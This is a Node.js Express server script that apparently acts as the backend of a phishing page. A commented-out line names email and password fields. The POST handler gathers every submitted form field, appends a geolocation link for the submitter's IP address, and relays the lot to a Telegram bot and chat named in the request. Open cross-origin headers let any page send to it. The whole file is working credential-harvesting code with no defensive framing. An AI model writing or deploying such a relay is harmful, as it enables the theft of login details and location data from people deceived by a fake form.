var express = require('express');
var bodyParser = require('body-parser');
const PORT = process.env.PORT || 5000;
const TelegramBot = require('node-telegram-bot-api');
var multer = require('multer');
var upload = multer();
var app = express();

app.get('/', function(req, res){
   res.render('form');
});

app.set('view engine', 'pug');
app.set('views', './views');

// for parsing application/json
app.use(bodyParser.json()); 

// for parsing application/xwww-
app.use(bodyParser.urlencoded({ extended: true })); 
//form-urlencoded

// // for parsing multipart/form-data
// app.use(upload.array()); 
// app.use(express.static('public'));

app.post('/', function(req, res){
   res.header("Access-Control-Allow-Origin", "*");
   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  
   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
       let msg='';
  for (let [key, value] of Object.entries(req.body.val)) {
  msg +=key+' : '+ value+'\n';
 
}
msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
     
   console.log(msg);


// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(req.body.tok, {polling: true});

bot.sendMessage(req.body.telid, msg);
   res.send("recieved your request!");
});

app.listen(PORT);
